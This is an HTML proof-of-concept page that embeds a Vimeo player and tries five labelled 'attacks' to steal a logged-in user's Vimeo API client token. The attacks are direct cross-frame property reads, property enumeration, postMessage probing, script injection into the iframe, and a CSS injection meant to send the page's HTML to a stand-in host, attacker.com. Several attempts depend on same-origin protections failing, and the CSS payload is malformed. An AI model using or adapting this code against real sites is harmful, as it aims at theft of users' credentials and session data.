<!DOCTYPE html>
<html>
<head>
    <title>Vimeo Token Extraction - Advanced PoC</title>
</head>
<body>
    <h1>üî¥ Advanced Vimeo Token Extraction</h1>
    
    <!-- Load with your actual cookies to authenticate -->
    <iframe id="vimeo" 
            src="https://player.vimeo.com/video/935884964?background=1"
            width="640" 
            height="360">
    </iframe>

    <div id="results"></div>

    <script>
        const iframe = document.getElementById('vimeo');
        const results = document.getElementById('results');

        function log(title, data) {
            const div = document.createElement('div');
            div.innerHTML = `<h3>${title}</h3><pre>${JSON.stringify(data, null, 2)}</pre><hr>`;
            results.appendChild(div);
        }

        setTimeout(() => {
            console.log('=== ATTACK 1: Direct Property Access ===');
            
            try {
                // Try to access window.playerConfig directly
                const config = iframe.contentWindow.playerConfig;
                console.log('‚úÖ playerConfig accessible:', config);
                log('CRITICAL: playerConfig accessible', config);
                
                if (config && config.user) {
                    console.log('üö® API TOKEN:', config.user.vimeo_api_client_token);
                    log('üö® STOLEN TOKEN', {
                        token: config.user.vimeo_api_client_token,
                        userId: config.user.id
                    });
                }
            } catch (e) {
                console.log('‚ùå Same-origin policy blocked:', e.message);
                log('Same-origin policy blocks direct access', { error: e.message });
            }

            console.log('=== ATTACK 2: Enumerate iframe properties ===');
            
            try {
                // Try to enumerate what's accessible
                const props = Object.getOwnPropertyNames(iframe.contentWindow);
                console.log('Accessible properties:', props);
                log('Accessible contentWindow properties', props);
            } catch (e) {
                console.log('‚ùå Cannot enumerate:', e.message);
            }

            console.log('=== ATTACK 3: Access via postMessage + timing ===');
            
            // Try to exploit race condition
            window.addEventListener('message', (e) => {
                if (e.origin === 'https://player.vimeo.com') {
                    console.log('Message received:', e);
                    
                    // Check if playerConfig leaked
                    if (e.data && typeof e.data === 'object') {
                        const str = JSON.stringify(e.data);
                        if (str.includes('vimeo_api_client_token')) {
                            console.log('üö® TOKEN LEAKED via postMessage!');
                            log('üö® TOKEN LEAKED', e.data);
                        }
                    }
                }
            });

            // Try to request full player state/config
            iframe.contentWindow.postMessage({
                method: 'getVideoEmbedCode'
            }, '*');

        }, 3000);

        // ATTACK 4: Try to inject script via iframe manipulation
        setTimeout(() => {
            console.log('=== ATTACK 4: Script Injection ===');
            
            try {
                // Try to inject script into iframe
                const script = iframe.contentDocument.createElement('script');
                script.textContent = `
                    if (window.playerConfig && window.playerConfig.user) {
                        window.parent.postMessage({
                            stolen: true,
                            token: window.playerConfig.user.vimeo_api_client_token
                        }, '*');
                    }
                `;
                iframe.contentDocument.body.appendChild(script);
                console.log('‚úÖ Script injection succeeded!');
            } catch (e) {
                console.log('‚ùå Script injection blocked:', e.message);
            }
        }, 4000);

        // ATTACK 5: CSS-based data exfiltration
        setTimeout(() => {
            console.log('=== ATTACK 5: CSS Injection ===');
            
            try {
                const style = iframe.contentDocument.createElement('style');
                style.textContent = `
                    * { 
                        background: url('https://attacker.com/leak?html=' + escape(document.documentElement.innerHTML)); 
                    }
                `;
                iframe.contentDocument.head.appendChild(style);
                console.log('‚úÖ CSS injection succeeded!');
            } catch (e) {
                console.log('‚ùå CSS injection blocked:', e.message);
            }
        }, 5000);

    </script>
</body>
</html>
